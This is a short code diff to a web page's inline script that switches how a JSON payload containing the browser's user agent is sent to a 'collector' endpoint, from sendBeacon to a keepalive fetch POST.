@@ -358,10 +358,13 @@ document.addEventListener('keyup', (e) => {
       ua_full: navigator.userAgent
     };
 
-    navigator.sendBeacon(
-      collector,
-      new Blob([JSON.stringify(payload)], { type: "application/json" })
-    );
+fetch(collector, {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify(payload),
+  keepalive: true
+});
+
 
   })();
 </script>
@@ -386,5 +389,6 @@ referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
 	
 </body>
 </html>
+
 
 
